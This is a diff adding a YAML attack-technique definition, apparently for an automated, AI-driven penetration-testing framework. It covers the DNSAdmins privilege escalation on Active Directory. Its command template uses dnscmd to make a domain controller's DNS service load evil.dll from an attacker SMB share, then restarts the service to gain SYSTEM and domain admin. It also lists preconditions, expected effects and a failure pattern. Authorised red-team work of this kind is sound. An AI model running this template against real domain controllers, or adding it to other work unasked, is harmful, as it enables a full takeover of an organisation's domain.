@@ -1,0 +1,35 @@
+name: dnsadmins
+category: ad
+description: DNSAdmins privesc — load DLL into DNS service for SYSTEM on DC
+preconditions:
+- domain_joined
+- has_cred
+- group_member==DNSAdmins
+parameters:
+  target_ip: from_engagement.target_ip
+  attacker_smb_share: from_engagement.attacker_smb_share
+command_template: dnscmd {target_ip} /config /serverlevelplugindll {attacker_smb_share}\evil.dll
+  && sc.exe \\\\{target_ip} stop dns && sc.exe \\\\{target_ip} start dns
+parser: generic_parser
+expected_effects:
+- system_on_dc
+- dll_loaded
+- domain_admin
+falsifier:
+  pattern: ACCESS_DENIED|RPC_S|denied|service not found
+  timeout: 60
+model_tier: sonnet
+mechanism: 'Members of DNSAdmins can configure dnscmd to load an arbitrary DLL via
+  the
+
+  ServerLevelPluginDll registry key. The DNS service runs as SYSTEM on a DC, so
+
+  on next service restart the DLL executes as SYSTEM → effective domain takeover.
+
+  Patched logic in CVE-2021-40469 but many environments lag.
+
+  '
+references:
+  ocd_mindmap: 'Branch 8: DNSAdmins (CVE-2021-40469)'
+  hacktricks: windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.md
+hacktricks_ref: windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.md
